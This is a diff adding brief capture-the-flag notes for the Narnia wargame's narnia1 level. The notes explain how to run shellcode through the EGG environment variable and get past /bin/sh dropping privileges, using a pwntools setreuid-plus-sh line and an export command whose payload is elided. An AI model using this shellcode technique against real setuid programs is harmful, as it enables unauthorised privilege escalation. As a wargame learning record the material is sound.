@@ -1,0 +1,18 @@
+narnia1 will execute the machine code in environment variable EGG.  Although
+narnia1 is a suid binary owned by narnia2 it is not sufficient to directly
+launch /bin/sh.  This is special for sh (and bash, etc) as it by defaults
+resets the effective user euid to the real user ruid on startup. This can be
+avoided in two ways:
+
+ - Change the ruid to the euid first and then execve /bin/sh using setreuid.
+ - Start in privileged mode with /bin/sh -p
+
+Question: Why do this if you can simply add `-p`?
+
+Using pwntools:
+
+pwn.asm(pwn.shellcraft.setreuid()+pwn.shellcraft.sh())
+# Use echo -e to support hex like \xa0
+# Use ' and not " to avoid substituting e.g. $
+export EGG=$(echo -e '...')
+./narnia1
